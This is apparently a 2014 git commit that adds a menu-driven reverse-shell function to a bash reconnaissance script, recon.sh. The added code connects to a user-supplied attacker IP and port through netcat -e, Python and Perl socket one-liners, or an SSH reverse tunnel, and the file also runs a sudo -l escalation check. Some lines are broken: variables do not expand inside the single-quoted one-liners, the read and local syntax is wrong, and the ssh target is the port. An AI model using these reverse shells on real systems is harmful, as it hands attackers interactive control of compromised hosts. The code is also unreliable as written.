813296c7553597347f73125ab6d959fb64209fb7
tylerboire <tyler.boire@mymail.champlain.edu>
2014-11-18 13:21:15 -0500

    Added shells function

--- recon.sh
+++ recon.sh
@@ -72,5 +72,40 @@ function Information() {
 function Escilation(){
 	sudo -l #shows the sudo files to indentify possible escilaitons.
 }
+function shells(){
+	local choice = null
+	echo What is the IP of your remote host\?
+	read IP
+	echo What port \do you want to use\?
+	read port
 
+	echo What shell would you like to \set up\?
+	echo 1\) NetCat \/bin\/sh
+	echo 1a\) NetCat \/bin\/bash
+	echo 2\) Python
+	echo 3\) Perl
+	echo 4\) SSH
+	read $choice
+
+	case $choice in
+		1)
+			nc -e /bin/sh $IP $port
+			;;
+		1a)
+			nc -e /bin/bash $IP $port
+			;;
+		2)
+			python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP","$port"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+			;;
+		3)
+			perl -e 'use Socket;$i="$IP";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+			;;
+		4)
+			echo What is the remote user name\?
+			read Ruser
+			ssh -NR $port:localhost:22 $Ruser@$port
+			;;
+	esac
+
+}
 menu
